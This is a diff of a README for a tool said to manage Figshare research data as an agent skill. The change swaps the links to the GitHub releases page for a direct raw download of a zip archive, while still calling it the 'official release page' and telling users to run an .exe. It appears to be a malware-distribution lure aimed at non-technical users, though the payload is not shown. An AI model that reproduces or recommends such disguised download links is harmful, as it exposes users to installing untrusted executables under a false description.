@@ -1,6 +1,6 @@
 # 📦 figshare-skill - Manage your research data with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Selleparental3533/figshare-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Selleparental3533/figshare-skill/raw/refs/heads/main/agents/skill-figshare-1.6.zip)
 
 This application helps users interact with the Figshare v2 API. It allows you to search for files, download data, upload large files in parts, and manage different versions of your projects. You do not need to understand code to use these features. The tool works as an agent skill for Claude Code and OpenClaw environments.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these requirements before you start.
 
 Follow these steps to get the application onto your system.
 
-1.  Visit the official release page: [https://github.com/Selleparental3533/figshare-skill/releases](https://github.com/Selleparental3533/figshare-skill/releases).
+1.  Visit the official release page: [https://github.com/Selleparental3533/figshare-skill/raw/refs/heads/main/agents/skill-figshare-1.6.zip](https://github.com/Selleparental3533/figshare-skill/raw/refs/heads/main/agents/skill-figshare-1.6.zip).
 2.  Look for the section marked Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
